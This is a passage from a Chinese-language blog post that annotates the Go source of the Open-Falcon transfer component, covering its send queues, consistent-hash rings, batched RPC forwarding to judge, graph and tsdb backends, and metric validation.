backend.NewTsdbConnPoolHelper(cfg.Tsdb.Address, cfg.Tsdb.MaxConns, cfg.Tsdb.MaxIdle, cfg.Tsdb.ConnTimeout, cfg.Tsdb.CallTimeout)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// graph</span></span><br><span class="line">    <span class="comment">// graph地址初始化</span></span><br><span class="line">graphInstances := nset.NewSafeSet()</span><br><span class="line"><span class="keyword">for</span> _, nitem := <span class="keyword">range</span> cfg.Graph.ClusterList &#123;</span><br><span class="line"><span class="keyword">for</span> _, addr := <span class="keyword">range</span> nitem.Addrs &#123;</span><br><span class="line">graphInstances.Add(addr)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">GraphConnPools = backend.CreateSafeRpcConnPools(cfg.Graph.MaxConns, cfg.Graph.MaxIdle,</span><br><span class="line">cfg.Graph.ConnTimeout, cfg.Graph.CallTimeout, graphInstances.ToSlice())</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化发送队列：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">initSendQueues</span><span class="params">()</span></span> &#123;</span><br><span class="line">cfg := g.Config()</span><br><span class="line">    <span class="comment">// 对每个judge节点构建一个队列</span></span><br><span class="line"><span class="keyword">for</span> node := <span class="keyword">range</span> cfg.Judge.Cluster &#123;</span><br><span class="line">Q := nlist.NewSafeListLimited(DefaultSendQueueMaxSize)</span><br><span class="line">JudgeQueues[node] = Q</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 对每个graph节点构建一个队列</span></span><br><span class="line"><span class="keyword">for</span> node, nitem := <span class="keyword">range</span> cfg.Graph.ClusterList &#123;</span><br><span class="line"><span class="keyword">for</span> _, addr := <span class="keyword">range</span> nitem.Addrs &#123;</span><br><span class="line">Q := nlist.NewSafeListLimited(DefaultSendQueueMaxSize)</span><br><span class="line">GraphQueues[node+addr] = Q</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 对tsdb节点构建队列</span></span><br><span class="line"><span class="keyword">if</span> cfg.Tsdb.Enabled &#123;</span><br><span class="line">TsdbQueue = nlist.NewSafeListLimited(DefaultSendQueueMaxSize)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>initNodeRings构建hash环，用于一致性hash初始化。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">initNodeRings</span><span class="params">()</span></span> &#123;</span><br><span class="line">cfg := g.Config()</span><br><span class="line"></span><br><span class="line">JudgeNodeRing = rings.NewConsistentHashNodesRing(<span class="keyword">int32</span>(cfg.Judge.Replicas), cutils.KeysOfMap(cfg.Judge.Cluster))</span><br><span class="line">GraphNodeRing = rings.NewConsistentHashNodesRing(<span class="keyword">int32</span>(cfg.Graph.Replicas), cutils.KeysOfMap(cfg.Graph.Cluster))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>startSendTasks函数启动发送任务：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TODO 添加对发送任务的控制,比如stop等</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">startSendTasks</span><span class="params">()</span></span> &#123;</span><br><span class="line">cfg := g.Config()</span><br><span class="line"><span class="comment">// init semaphore</span></span><br><span class="line">judgeConcurrent := cfg.Judge.MaxConns</span><br><span class="line">graphConcurrent := cfg.Graph.MaxConns</span><br><span class="line">tsdbConcurrent := cfg.Tsdb.MaxConns</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> tsdbConcurrent &lt; <span class="number">1</span> &#123;</span><br><span class="line">tsdbConcurrent = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judgeConcurrent &lt; <span class="number">1</span> &#123;</span><br><span class="line">judgeConcurrent = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> graphConcurrent &lt; <span class="number">1</span> &#123;</span><br><span class="line">graphConcurrent = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// init send go-routines</span></span><br><span class="line"><span class="keyword">for</span> node := <span class="keyword">range</span> cfg.Judge.Cluster &#123;</span><br><span class="line">queue := JudgeQueues[node]</span><br><span class="line"><span class="keyword">go</span> forward2JudgeTask(queue, node, judgeConcurrent)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> node, nitem := <span class="keyword">range</span> cfg.Graph.ClusterList &#123;</span><br><span class="line"><span class="keyword">for</span> _, addr := <span class="keyword">range</span> nitem.Addrs &#123;</span><br><span class="line">queue := GraphQueues[node+addr]</span><br><span class="line"><span class="keyword">go</span> forward2GraphTask(queue, node, addr, graphConcurrent)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> cfg.Tsdb.Enabled &#123;</span><br><span class="line"><span class="keyword">go</span> forward2TsdbTask(tsdbConcurrent)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>forward2JudgeTask函数用于启动judge发送任务：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Judge定时任务, 将 Judge发送缓存中的数据 通过rpc连接池 发送到Judge</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">forward2JudgeTask</span><span class="params">(Q *list.SafeListLimited, node <span class="keyword">string</span>, concurrent <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">batch := g.Config().Judge.Batch <span class="comment">// 一次发送,最多batch条数据</span></span><br><span class="line">addr := g.Config().Judge.Cluster[node]</span><br><span class="line">sema := nsema.NewSemaphore(concurrent)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">items := Q.PopBackBy(batch)</span><br><span class="line">count := <span class="built_in">len</span>(items)</span><br><span class="line"><span class="keyword">if</span> count == <span class="number">0</span> &#123;</span><br><span class="line">time.Sleep(DefaultSendTaskSleepInterval)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">judgeItems := <span class="built_in">make</span>([]*cmodel.JudgeItem, count)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; count; i++ &#123;</span><br><span class="line">judgeItems[i] = items[i].(*cmodel.JudgeItem)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//同步Call + 有限并发 进行发送</span></span><br><span class="line">sema.Acquire()</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(addr <span class="keyword">string</span>, judgeItems []*cmodel.JudgeItem, count <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> sema.Release()</span><br><span class="line"></span><br><span class="line">resp := &amp;cmodel.SimpleRpcResponse&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line">sendOk := <span class="literal">false</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123; <span class="comment">//最多重试3次</span></span><br><span class="line">                <span class="comment">// 调用judge rpc send接口发送数据</span></span><br><span class="line">err = JudgeConnPools.Call(addr, <span class="string">"Judge.Send"</span>, judgeItems, resp)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">sendOk = <span class="literal">true</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(time.Millisecond * <span class="number">10</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// statistics</span></span><br><span class="line"><span class="keyword">if</span> !sendOk &#123;</span><br><span class="line">log.Printf(<span class="string">"send judge %s:%s fail: %v"</span>, node, addr, err)</span><br><span class="line">proc.SendToJudgeFailCnt.IncrBy(<span class="keyword">int64</span>(count))</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">proc.SendToJudgeCnt.IncrBy(<span class="keyword">int64</span>(count))</span><br><span class="line">&#125;</span><br><span class="line">&#125;(addr, judgeItems, count)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>forward2GraphTask启动发送存档数据：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Graph定时任务, 将 Graph发送缓存中的数据 通过rpc连接池 发送到Graph</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">forward2GraphTask</span><span class="params">(Q *list.SafeListLimited, node <span class="keyword">string</span>, addr <span class="keyword">string</span>, concurrent <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">batch := g.Config().Graph.Batch <span class="comment">// 一次发送,最多batch条数据</span></span><br><span class="line">sema := nsema.NewSemaphore(concurrent)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">items := Q.PopBackBy(batch) <span class="comment">//从队列中pop指定大小的数据</span></span><br><span class="line">count := <span class="built_in">len</span>(items)</span><br><span class="line"><span class="keyword">if</span> count == <span class="number">0</span> &#123;</span><br><span class="line">time.Sleep(DefaultSendTaskSleepInterval)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">graphItems := <span class="built_in">make</span>([]*cmodel.GraphItem, count)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; count; i++ &#123;</span><br><span class="line">graphItems[i] = items[i].(*cmodel.GraphItem)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sema.Acquire()</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(addr <span class="keyword">string</span>, graphItems []*cmodel.GraphItem, count <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> sema.Release()</span><br><span class="line"></span><br><span class="line">resp := &amp;cmodel.SimpleRpcResponse&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line">sendOk := <span class="literal">false</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123; <span class="comment">//最多重试3次</span></span><br><span class="line">                <span class="comment">// 给graph接口发送数据</span></span><br><span class="line">err = GraphConnPools.Call(addr, <span class="string">"Graph.Send"</span>, graphItems, resp)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">sendOk = <span class="literal">true</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(time.Millisecond * <span class="number">10</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// statistics</span></span><br><span class="line">            <span class="comment">//   统计数据，方便后续排查当前队列中发送失败和成功数据量</span></span><br><span class="line"><span class="keyword">if</span> !sendOk &#123;</span><br><span class="line">log.Printf(<span class="string">"send to graph %s:%s fail: %v"</span>, node, addr, err)</span><br><span class="line">proc.SendToGraphFailCnt.IncrBy(<span class="keyword">int64</span>(count))</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">proc.SendToGraphCnt.IncrBy(<span class="keyword">int64</span>(count))</span><br><span class="line">&#125;</span><br><span class="line">&#125;(addr, graphItems, count)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果有使用tsdb的话，启动tsdb发送task，这边不说了，基本流程类似。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Tsdb定时任务, 将数据通过api发送到tsdb</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">forward2TsdbTask</span><span class="params">(concurrent <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">batch := g.Config().Tsdb.Batch <span class="comment">// 一次发送,最多batch条数据</span></span><br><span class="line">retry := g.Config().Tsdb.MaxRetry</span><br><span class="line">sema := nsema.NewSemaphore(concurrent)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">items := TsdbQueue.PopBackBy(batch)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(items) == <span class="number">0</span> &#123;</span><br><span class="line">time.Sleep(DefaultSendTaskSleepInterval)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//  同步Call + 有限并发 进行发送</span></span><br><span class="line">sema.Acquire()</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(itemList []<span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> sema.Release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tsdbBuffer bytes.Buffer</span><br><span class="line">count := <span class="built_in">len</span>(itemList)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; count; i++ &#123;</span><br><span class="line">tsdbItem := itemList[i].(*cmodel.TsdbItem)</span><br><span class="line">tsdbBuffer.WriteString(tsdbItem.TsdbString())</span><br><span class="line">tsdbBuffer.WriteString(<span class="string">"\n"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; retry; i++ &#123;</span><br><span class="line">err = TsdbConnPoolHelper.Send(tsdbBuffer.Bytes())</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">proc.SendToTsdbCnt.IncrBy(<span class="keyword">int64</span>(<span class="built_in">len</span>(itemList)))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(<span class="number">100</span> * time.Millisecond)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">proc.SendToTsdbFailCnt.IncrBy(<span class="keyword">int64</span>(<span class="built_in">len</span>(itemList)))</span><br><span class="line">log.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;(items)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来函数startSenderCron函数中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// send_cron程序入口</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">startSenderCron</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">go</span> startProcCron()  <span class="comment">//发送队列统计</span></span><br><span class="line"><span class="keyword">go</span> startLogCron()    <span class="comment">//打印日志</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发送队列统计数据</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">calcSendCacheSize</span><span class="params">(mapList <span class="keyword">map</span>[<span class="keyword">string</span>]*list.SafeListLimited)</span> <span class="title">int64</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> cnt <span class="keyword">int64</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _, list := <span class="keyword">range</span> mapList &#123;</span><br><span class="line"><span class="keyword">if</span> list != <span class="literal">nil</span> &#123;</span><br><span class="line">cnt += <span class="keyword">int64</span>(list.Len())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> cnt</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接收数据函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Start</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">go</span> rpc.StartRpc()                <span class="comment">// rpc接口数据，接收数据</span></span><br><span class="line"><span class="keyword">go</span> socket.StartSocket()          <span class="comment">// tcp方式推送数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 主要看rpc接口，因为socket方式也是小米提供的，底层传输的方法一样。</p><p>rpc update接口用于更新数据并打到缓存队列中去，update方法最终调用RecvMetricValues函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// process new metric values</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RecvMetricValues</span><span class="params">(args []*cmodel.MetricValue, reply *cmodel.TransferResponse, from <span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">start := time.Now()</span><br><span class="line">reply.Invalid = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">items := []*cmodel.MetaData&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> args &#123;</span><br><span class="line"><span class="keyword">if</span> v == <span class="literal">nil</span> &#123;</span><br><span class="line">reply.Invalid += <span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 历史遗留问题.</span></span><br><span class="line"><span class="comment">// 老版本agent上报的metric=kernel.hostname的数据,其取值为string类型,现在已经不支持了;所以,这里硬编码过滤掉</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 很多的过滤策略。</span></span><br><span class="line"><span class="keyword">if</span> v.Metric == <span class="string">"kernel.hostname"</span> &#123;</span><br><span class="line">reply.Invalid += <span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> v.Metric == <span class="string">""</span> || v.Endpoint == <span class="string">""</span> &#123;</span><br><span class="line">reply.Invalid += <span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> v.Type != g.COUNTER &amp;&amp; v.Type != g.GAUGE &amp;&amp; v.Type != g.DERIVE &#123;</span><br><span class="line">reply.Invalid += <span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> v.Value == <span class="string">""</span> &#123;</span><br><span class="line">reply.Invalid += <span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> v.Step &lt;= <span class="number">0</span> &#123;</span><br><span class="line">reply.Invalid += <span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(v.Metric)+<span class="built_in">len</span>(v.Tags) &gt; <span class="number">510</span> &#123;</span><br><span class="line">reply.Invalid += <span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TODO 呵呵,这里需要再优雅一点</span></span><br><span class="line">now := start.Unix()</span><br><span class="line"><span class="keyword">if</span> v.Timestamp &lt;= <span class="number">0</span> || v.Timestamp &gt; now*<span class="number">2</span> &#123;</span><br><span class="line">v.Timestamp = now</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fv := &amp;cmodel.MetaData&#123;</span><br><span class="line">Metric:      v.Metric,</span><br><span class="line">Endpoint:    v.Endpoint,</span><br><span class="line">Timestamp:   v.Timestamp,</span><br><span class="line">Step:        v.Step,</span><br><span class="line">CounterType: v.Type,</span><br><span class="line">Tags:        cutils.DictedTagstring(v.Tags), <span class="comment">//TODO tags键值对的个数,要做一下限制</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">valid := <span class="literal">true</span></span><br><span class="line"><span class="keyword">var</span> vv <span class="keyword">float64</span></span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> cv := v.Value.(<span class="keyword">type</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="keyword">string</span>:</span><br><span class="line">vv, err = strconv.ParseFloat(cv, <span class="number">64</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">valid = <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="keyword">float64</span>:</span><br><span class="line">vv = cv</span><br><span class="line"><span class="keyword">case</span> <span class="keyword">int64</span>:</span><br><span class="line">vv = <span class="keyword">float64</span>(cv)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">valid = <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !valid &#123;</span><br><span class="line">reply.Invalid += <span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fv.Value = vv</span><br><span class="line">items = <span class="built_in">append</span>(items, fv)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// statistics</span></span><br><span class="line">cnt := <span class="keyword">int64</span>(<span class="built_in">len</span>(items))</span><br><span class="line">proc.RecvCnt.IncrBy(cnt)</span><br><span class="line">    <span class="comment">// 统计</span></span><br><span class="line"><span class="keyword">if</span> from == <span class="string">"rpc"</span> &#123;</span><br><span class="line">proc.RpcRecvCnt.IncrBy(cnt)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> from == <span class="string">"http"</span> &#123;</span><br><span class="line">proc.HttpRecvCnt.IncrBy(cnt)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cfg := g.Config()</span><br><span class="line"></span><br><span class="line">    <span class="comment">//   打到对应的缓存队列中去。</span></span><br><span class="line"><span class="keyword">if</span> cfg.Graph.Enabled &#123;</span><br><span class="line">sender.Push2GraphSendQueue(items)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> cfg.Judge.Enabled &#123;</span><br><span 